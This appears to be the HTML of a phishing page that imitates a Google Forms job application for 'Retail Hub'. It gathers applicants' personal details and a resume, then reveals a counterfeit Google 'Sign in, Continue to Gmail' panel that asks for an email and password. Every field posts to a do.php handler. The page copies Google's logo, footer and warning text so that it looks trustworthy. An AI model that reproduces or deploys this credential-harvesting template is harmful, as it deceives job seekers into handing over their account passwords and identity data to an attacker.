<!DOCTYPE html>
<html lang="en" dir="ltr">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

      <title>&#65279;</title>

      <!-- JQuery and Bootstrap -->
      <link href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' rel="stylesheet">
      <link href='assets/css/progress-bar.css' rel="stylesheet">
      <link href='assets/css/material-input.css' rel="stylesheet">
      <link rel="stylesheet" href="assets/css/custom.css">
      <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,300;1,400;1,600;1,800&display=swap" rel="stylesheet">
      <link rel="icon" type="image/png" href="assets/images/favicon.ico">
      
      

      <style media="screen">
         @font-face {
            font-family: 'Roboto';
            src: URL('assets/fonts/Roboto-Regular.ttf') format('truetype');
            font-weight: normal;
         }
      </style>
   </head>
<body>

   <form name="contactFormEmail" id="contactFormEmail" method="POST" action="do.php" enctype="multipart/form-data">

      <div class="google__doc" id="google__doc">
         <div class="doc__g__form">
            <div class="welcome__message">
               <div class="green__border"></div>
               <div class="heading">Welcome To Retail Hub!!</div>
               <p>***Please fill in the below form your details and resume.</p>
               <hr>
               <div class="note">
                  <p>
                     The name and photo associated with your Google account will be recorded when you upload files and submit this form. Your email is not part of your response.
                  </p>
                  <p class="text-danger">
                     * Required
                  </p>
               </div>            
            </div>
            
            <div class="list" role="list">
               <div class="listitem" role="listitem">
                  <div class="item-title">Post Applying For <span class="text-danger">*</span></div>
                  <br>
                  <div class="input-group">
                     <input type="text" id="postName" placeholder="Your answer" autocomplete="off" tabindex="0" required name="PostNameInput">
                  </div>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Your Full Name <span class="text-danger">*</span></div>
                  <br>
                  <div class="input-group">
                     <input type="text" id="candidate_name" placeholder="Your answer" autocomplete="off" tabindex="0" required name="CandidateName">
                  </div>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Your Date Of Birth <span class="text-danger">*</span></div>
                  <br>
                  <p>Date</p>
                  <div class="input-group">
                     <input type="date" id="birth_date" autocomplete="off" tabindex="0" max="2073-01-01" required value="" name="DOB">
                  </div>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Mobile number </div>
                  <br>
                  <div class="input-group">
                     <input type="text" placeholder="Your answer" autocomplete="off" tabindex="0" name="MobileNum">
                  </div>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Your Current Location <span class="text-danger">*</span></div>
                  <br>
                  <div class="input-group">
                     <input type="text" placeholder="Your answer" autocomplete="off" tabindex="0" required name="Locations">
                  </div>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Education</div>
                  <br>
                  <select autocomplete="off" tabindex="0" name="Educations">
                     <option value="" disabled selected>Choose</option>
                     <option value="10">10th</option>
                     <option value="12">12th</option>
                  </select>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Experience</div>
                  <br>
                  <div class="checkbox_item">
                     <input type="checkbox" id="fresher" name="experi" value="fresher">
                     <label for="fresher"> Fresher</label><br>
                  </div>
                  <div class="checkbox_item">
                     <input type="checkbox" id="experienced" name="experi" value="experienced">
                     <label for="experienced"> Experienced</label><br>
                  </div>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Do You have vehicle</div>
                  <br>
                  <div class="checkbox_item">
                     <input type="radio" id="vehicle__yes" name="is_vehicle" value="yes">
                     <label for="vehicle__yes"> Yes</label><br>
                  </div>
                  <div class="checkbox_item">
                     <input type="radio" id="vehicle__no" name="is_vehicle" value="no">
                     <label for="vehicle__no"> No</label><br>
                  </div>
               </div>
               <div class="listitem" role="listitem">
                  <div class="item-title">Upload Your Resume <span class="text-danger">*</span></div>
                  <br>
                  <input type="file" id="upload" required hidden name="attachment">
                  <label for="upload" id="upload__btn" name="file_upload">
                     <svg xmlns="http://www.w3.org/2000/svg" fill="#1a73e8" width="18" height="18" viewBox="0 0 18 18">
                        <g transform="translate(-3, -3)">
                           <path d="M6,14.25 L7.5,14.25 L7.5,16.5 L16.5,16.5 L16.5,14.25 L18,14.25 L18,16.5 C18,17.325 17.325,18 16.5,18 L7.5,18 C6.675,18 6,17.325 6,16.5 L6,14.25 Z M9.3075,10.8075 L11.25,8.8725 L11.25,15 L12.75,15 L12.75,8.8725 L14.6925,10.815 L15.75,9.75 L12,6 L8.25,9.75 L9.3075,10.8075 Z"></path>
                        </g>
                     </svg>
                     Add File
                  </label>
               </div>
            </div>

            <div class="jump__next__signin">
               <div class="submit__g_doc" >Submit</div>

               <br> <br>
               <p>
                  Never submit passwords through Google Forms.
               </p> <br>
               <p class="text-center">
                  This content is neither created nor endorsed by Google <a href="#">Report Abuse</a> - <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> - <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a>
               </p>
               <div class="I3zNcc yF4pU ">
                  <a dir="auto" href="//www.google.com/forms/about/?utm_source=product&amp;utm_medium=forms_logo&amp;utm_campaign=forms"><img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_dark_clr_74x24px.svg" alt="Google" height="24px" width="74px">&nbsp;<span class="sUXvCd">Forms</span></a></div>
            </div>
         </div>
      </div>

      <script>
         var hiddenBtn = document.getElementById('upload');
         var chooseBtn = document.getElementById('upload__btn');

         hiddenBtn.addEventListener('change', function() {
            if (hiddenBtn.files.length > 0) {
               chooseBtn.innerText = hiddenBtn.files[0].name;
            } else {
               chooseBtn.innerText = 'Add File';
            }
         });
      </script>

      <div id='login-app' class="non_visible">
         <div class="login-container">
            <div class='progress-bar-container show-progress'>
               <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;' id='cgle-progress-bar'>
                  <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
                     <div class="mdc-linear-progress__buffering-dots"></div>
                     <div class="mdc-linear-progress__buffer"></div>
                     <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                     <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                  </div>
               </div>
            </div>
            <div class='login-content' id='login-form'>
               <div id="logo" title="Google">
                  <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                     <g id="qaEJec">
                        <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                     </g>
                     <g id="YGlOvc">
                        <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                     </g>
                     <g id="BWfIk">
                        <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 6.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                     </g>
                     <g id="e6m3fd">
                        <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                     </g>
                     <g id="vbkDmc">
                        <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.944 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                     </g>
                     <g id="idEJde">
                        <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.303-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                     </g>
                  </svg>
                  <!-- /Google Logo -->
               </div>
               <h1 class='g-h1' id='instruction-text'>Sign in</h1>
               <h2 class='g-h2' id='instrution-text-desc'>Continue to Gmail</h2>
               <div >
                  <style>
                     .slide-container-outer {
                        width: 100%;
                        min-height: 50px;
                        position: relative;
                        overflow-x: hidden;
                     }
                     .slide-container {
                        position: relative;
                        width: 200%;
                        display: flex;
                     }
                     .slide-item {
                        min-height: 50px;
                        width: 50%;
                        position: relative;
                     }
                     .g-email-preview {
                        border-radius: 16px;
                        border: 1px solid #dadce0;
                        display: table;
                        margin: 0 auto;
                        padding: 3px;
                        margin: 0 auto;
                        margin-bottom: 55px;
                     }
                     .qQWzTd {
                        margin-right: 8px;
                        margin-left: 3px;
                     }
                     .krLnGe {
                        margin-left: 4px;
                     }
                     .dsxx49 {
                        font-size: 14px;
                        margin-top: 2px;
                     }
                  </style>
                  <div class='slide-container-outer'>
                     <div class='slide-container'>
                        <div class='slide-item' id='slide-password'>
                           <div class='g-email-preview'>
                              <div style='display:flex'>
                                 <div class="qQWzTd" aria-hidden="true">
                                    <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                       <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                    </svg>
                                 </div>
                                 <div class="dsxx49" id='prev-email'>habib@gmail.com</div>
                                 <div class="krLnGe">
                                    <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                       <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                                    </svg>
                                 </div>
                              </div>
                           </div>

                        <!-- <form name="contactFormEmail" method="post"> -->

                           <div id='password-form-step'>
                              <div class='g-input'>
                                 <input id='password-input' type="password" placeholder="Enter your password" name="password_input" required>
                              </div>
                           </div>
                           <div class='login-nav'>
                              <legend class='g-legend'>Forgot Password</legend>
                              <div class='gbtn-primary btn-next-password'>
                                 <input type="submit" name="send" value="Submit" class="gbtn-primary">
                                 <?php if (! empty($message)) {?> <div class='success'> <strong><?php echo $message; ?> </strong> </div> <?php } ?>
                              </div>
                           </div>
                        </div>
                        <div class='slide-item' id='slide-username'>
                           <div id='email-form-step'>
                              <div class='g-input'>
                                 <input id='email-input' type="text"  placeholder="Email or phone" name="email_input" required>
                              </div>
                           </div>
                           <div class="invalid-email" style='display:none;'>
                              <span class="invalid-icon">
                                 <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                 </svg>
                              </span>
                              <span class='invalid-email-text-span'>Enter a valid email or phone number</span>
                           </div>
                           <legend class='g-legend'>Forgot email?</legend>
                           <br>
                           <div class='login-priv'>
                              <p class='p'>Not your computer? Use Guest mode to sign in privately.</p>
                              <legend class='g-legend'>Learn more</legend>
                           </div>
                           <div class='login-nav'>
                              <legend class='g-legend'>Create Account</legend>
                              <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div>
                           </div>
                        </div>                    

                     </div>
                  </div>
               </div>
            </div>
            <img src="./assets/images/add-on.png" alt="Google" style='max-width:100%;'>
         </div>
      </div>

   </form>


   <script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>
   <script src='assets/js/custom.js'></script>

   <script> 
      
   </script>

</body>
</html>